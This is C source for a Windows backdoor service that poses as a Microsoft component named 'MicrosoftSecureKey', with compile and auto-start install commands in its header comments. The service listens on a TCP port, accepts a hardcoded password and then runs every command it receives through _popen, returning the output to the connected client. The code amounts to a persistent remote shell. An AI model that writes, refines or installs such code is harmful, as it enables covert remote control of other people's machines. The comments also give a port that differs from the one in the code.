//
// Service Windows for Command
//
// Compilation :
// x86_64-w64-mingw32-gcc -o MicrosoftSecureKey.exe MicrosoftSecureKey.c -lws2_32
//
// Installation :
// sc create MicrosoftSecureKey binPath="C:\Windows\System32\MicrosoftSecureKey.exe" start=auto
// sc start MicrosoftSecureKey
//
// Command :
// nc IP_SRV 5555
// Tape Password
// whoami

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define NAME "MicrosoftSecureKey"
#define PORT 55334
#define BUFFER_SIZE 1024
#define P4S5 "Password123!"
#define STOP_COMMAND "STOP_SERVICE"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hServiceStatusHandle;
SOCKET server_socket;
volatile BOOL should_stop = FALSE;

void ServiceMain(DWORD argc, LPTSTR *argv);
void ServiceCtrlHandler(DWORD Opcode);
void StartServer(void);
void ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
int AuthenticateClient(SOCKET client_socket);
void AddFirewallRule(void);
void RemoveFirewallRule(void);

int main(int argc, char *argv[]) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };
    
    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("Erreur StartServiceCtrlDispatcher: %d\n", GetLastError());
    }
    return 0;
}

void ServiceMain(DWORD argc, LPTSTR *argv) {
    hServiceStatusHandle = RegisterServiceCtrlHandler(NAME, ServiceCtrlHandler);
    if (!hServiceStatusHandle) {
        return;
    }

    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    
    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
    StartServer();
    ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

void ServiceCtrlHandler(DWORD Opcode) {
    switch(Opcode) {
        case SERVICE_CONTROL_STOP:
            ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
            should_stop = TRUE;
            closesocket(server_socket);
            ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
            break;
    }
}

void ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;

    ServiceStatus.dwCurrentState = dwCurrentState;
    ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    ServiceStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        ServiceStatus.dwControlsAccepted = 0;
    else
        ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    ServiceStatus.dwCheckPoint = ((dwCurrentState == SERVICE_RUNNING) || 
                                 (dwCurrentState == SERVICE_STOPPED)) ? 0 : dwCheckPoint++;

    SetServiceStatus(hServiceStatusHandle, &ServiceStatus);
}

int AuthenticateClient(SOCKET client_socket) {
    char buffer[BUFFER_SIZE];
    const char *auth_request = "";
    const char *auth_failed = "";
    const char *auth_success = "\n";

    send(client_socket, auth_request, strlen(auth_request), 0);
    int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
    
    if (bytes_received <= 0) return 0;
    
    buffer[bytes_received] = '\0';
    char *newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';
    newline = strchr(buffer, '\r');
    if (newline) *newline = '\0';

    if (strcmp(buffer, P4S5) == 0) {
        send(client_socket, auth_success, strlen(auth_success), 0);
        return 1;
    } else {
        send(client_socket, auth_failed, strlen(auth_failed), 0);
        return 0;
    }
}

void StartServer(void) {
    WSADATA wsaData;
    SOCKET client_socket;
    struct sockaddr_in server_addr, client_addr;
    char buffer[BUFFER_SIZE];
    int client_len = sizeof(client_addr);

    WSAStartup(MAKEWORD(2,2), &wsaData);
    
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) return;

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(server_socket);
        return;
    }

    listen(server_socket, 5);

    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

    while (!should_stop) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (client_socket == INVALID_SOCKET) {
            if (should_stop) break;
            continue;
        }

        if (!AuthenticateClient(client_socket)) {
            closesocket(client_socket);
            continue;
        }

        while (!should_stop) {
            int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
            if (bytes_received <= 0) break;

            buffer[bytes_received] = '\0';
            
            if (strcmp(buffer, STOP_COMMAND) == 0) {
                const char *stop_msg = "";
                send(client_socket, stop_msg, strlen(stop_msg), 0);
                should_stop = TRUE;
                closesocket(client_socket);
                closesocket(server_socket);
                WSACleanup();
                return;
            }

            FILE *fp = _popen(buffer, "r");
            if (fp != NULL) {
                while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
                    send(client_socket, buffer, strlen(buffer), 0);
                }
                _pclose(fp);
            } else {
                const char *error_msg = "";
                send(client_socket, error_msg, strlen(error_msg), 0);
            }
        }
        
        closesocket(client_socket);
    }
    
    WSACleanup();
}
